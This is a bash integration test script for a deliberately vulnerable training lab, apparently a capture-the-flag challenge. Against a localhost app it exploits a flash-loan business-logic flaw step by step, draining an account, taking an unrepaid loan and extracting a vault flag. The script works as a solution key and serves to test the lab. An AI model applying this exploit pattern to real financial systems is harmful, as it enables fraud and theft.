#!/bin/bash
# Integration test script for Muspelheim realm
# Tests the business logic flaw in flash loan system

set -e

REALM="muspelheim"
BASE_URL="http://localhost:8080/realms/${REALM}"
COLORS=true

# Color output
if [ "$COLORS" = true ]; then
  GREEN='\033[0;32m'
  RED='\033[0;31m'
  YELLOW='\033[1;33m'
  BLUE='\033[0;34m'
  NC='\033[0m'
else
  GREEN=''
  RED=''
  YELLOW=''
  BLUE=''
  NC=''
fi

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Testing MUSPELHEIM Realm${NC}"
echo -e "${BLUE}A06:2025 - Insecure Design${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Step 1: Health check
echo -e "${YELLOW}Step 1: Checking realm health...${NC}"
HEALTH_RESPONSE=$(curl -s "${BASE_URL}/health")
if echo "$HEALTH_RESPONSE" | grep -q '"status":"ok"'; then
  echo -e "${GREEN}✓ Health check passed${NC}"
else
  echo -e "${RED}✗ Health check failed${NC}"
  exit 1
fi
echo ""

# Step 2: Create user account
echo -e "${YELLOW}Step 2: Creating user account...${NC}"
USER_ID="exploit_user_$(date +%s)"
ACCOUNT_RESPONSE=$(curl -s "${BASE_URL}/api/account/${USER_ID}")
INITIAL_BALANCE=$(echo "$ACCOUNT_RESPONSE" | jq -r '.balance')
echo -e "${GREEN}✓ Account created with balance: $INITIAL_BALANCE${NC}"
echo ""

# Step 3: Withdraw all funds to have insufficient balance
echo -e "${YELLOW}Step 3: Withdrawing funds to create insufficient balance...${NC}"
WITHDRAW_RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"userId\":\"${USER_ID}\",\"amount\":${INITIAL_BALANCE}}" \
  "${BASE_URL}/api/withdrawal")

if echo "$WITHDRAW_RESPONSE" | grep -q '"success":true'; then
  echo -e "${GREEN}✓ Withdrawal successful${NC}"
  
  # Check balance is now 0
  ACCOUNT_RESPONSE=$(curl -s "${BASE_URL}/api/account/${USER_ID}")
  CURRENT_BALANCE=$(echo "$ACCOUNT_RESPONSE" | jq -r '.balance')
  echo -e "  Current balance: $CURRENT_BALANCE"
else
  echo -e "${RED}✗ Withdrawal failed${NC}"
  exit 1
fi
echo ""

# Step 4: Execute flash loan (VULNERABILITY)
echo -e "${YELLOW}Step 4: Executing flash loan with insufficient repayment...${NC}"
LOAN_AMOUNT=5000
LOAN_RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"userId\":\"${USER_ID}\",\"amount\":${LOAN_AMOUNT}}" \
  "${BASE_URL}/api/flash-loan")

if echo "$LOAN_RESPONSE" | grep -q '"success":true'; then
  echo -e "${GREEN}✓ Flash loan executed${NC}"
  
  # Check if exploited
  if echo "$LOAN_RESPONSE" | grep -q '"exploited":true'; then
    echo -e "${GREEN}✓ EXPLOITATION SUCCESSFUL!${NC}"
    echo -e "  Business logic flaw detected"
  else
    echo -e "${YELLOW}⚠ Loan succeeded but not marked as exploit${NC}"
  fi
else
  echo -e "${RED}✗ Flash loan failed${NC}"
  echo "$LOAN_RESPONSE"
  exit 1
fi
echo ""

# Step 5: Verify account state
echo -e "${YELLOW}Step 5: Verifying account exploit status...${NC}"
ACCOUNT_RESPONSE=$(curl -s "${BASE_URL}/api/account/${USER_ID}")
EXPLOITED=$(echo "$ACCOUNT_RESPONSE" | jq -r '.exploited')

if [ "$EXPLOITED" = "true" ]; then
  echo -e "${GREEN}✓ Account marked as exploited${NC}"
else
  echo -e "${RED}✗ Account not marked as exploited${NC}"
  exit 1
fi
echo ""

# Step 6: Access vault
echo -e "${YELLOW}Step 6: Accessing vault...${NC}"
VAULT_RESPONSE=$(curl -s "${BASE_URL}/api/vault?userId=${USER_ID}")

if echo "$VAULT_RESPONSE" | grep -q '"access":true'; then
  echo -e "${GREEN}✓ Vault accessed successfully${NC}"
else
  echo -e "${RED}✗ Vault access denied${NC}"
  echo "$VAULT_RESPONSE"
  exit 1
fi
echo ""

# Step 7: Extract flag
echo -e "${YELLOW}Step 7: Extracting flag...${NC}"
FLAG=$(echo "$VAULT_RESPONSE" | jq -r '.flag')

if [ -z "$FLAG" ] || [ "$FLAG" = "null" ]; then
  echo -e "${RED}✗ Flag not found in vault response${NC}"
  exit 1
fi

echo -e "${GREEN}✓ Flag extracted: $FLAG${NC}"
echo ""

# Step 8: Validate flag format
echo -e "${YELLOW}Step 8: Validating flag format...${NC}"
if echo "$FLAG" | grep -qP '^YGGDRASIL\{MUSPELHEIM:[a-f0-9-]+\}$'; then
  echo -e "${GREEN}✓ Flag format is valid${NC}"
else
  echo -e "${RED}✗ Invalid flag format: $FLAG${NC}"
  exit 1
fi
echo ""

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}✓ All MUSPELHEIM tests passed!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "Flag: ${BLUE}$FLAG${NC}"
echo ""
